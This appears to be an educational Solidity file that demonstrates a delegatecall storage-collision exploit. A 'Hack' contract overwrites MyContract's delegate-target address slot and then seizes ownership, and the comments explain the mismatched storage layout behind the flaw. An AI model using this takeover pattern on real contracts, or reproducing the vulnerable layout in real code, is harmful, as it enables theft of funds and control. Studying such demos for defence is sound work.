// SPDX-Licence-Identifier: MIT

pragma solidity ^0.8.0;


contract Hack {
    address public otherContract; 
    address public owner;

    MyContract public toHack;

    constructor(address _to) {
        toHack = MyContract(_to);
    }

    /**
     * uint(uint160(address(this))) => convert address to uint as delcallgetdata accepts uint
     */
    function attack() external {
        toHack.delCallGetData(uint(uint160(address(this))));
        toHack.delCallGetData(0); // 0 is timestamp 
    }

    /**
     * 
     * naming function same as AnotherContract function as we change othercontract address to msg.sender
     * as otherCOntract address is changed to Hack address, upcoming calls to getData will be implemented from this contract
     * and this function hack the AnotherContract and changes the owner to msg.sender
     */
    function getData(uint _timestamp) external payable {
        owner = msg.sender;
    }
}

contract MyContract {
    address public otherContract; // memory slots should moved below at,sender, amount. Otherwise addresses can be manipulated
    address public owner;

    uint public at;
    address public sender;
    uint public amount; 



    constructor(address _otherContract) {
        otherContract = _otherContract;
        owner = msg.sender;
    }

    /**
    * elegate call works same as call, but the difference is that msg.sender will not be MyContract, but the first one who sends MyContract contract
     * user > MyContract > AnotherContract. msg.sender here will be user address
     */
    function delCallGetData(uint timestamp) external payable {
        (bool success, ) = otherContract.delegatecall(
            abi.encodeWithSelector(AnotherContract.getData.selector, timestamp)
        );

        require(success, "failed");
    }
}


contract AnotherContract {
    uint public at;
    address public sender;
    uint public amount; 

    event Received(address sender, uint value);

    function getData(uint timestamp) external payable {
        at = timestamp;
        sender = msg.sender;
        amount = msg.value;
        emit Received(msg.sender, msg.value);
    }
}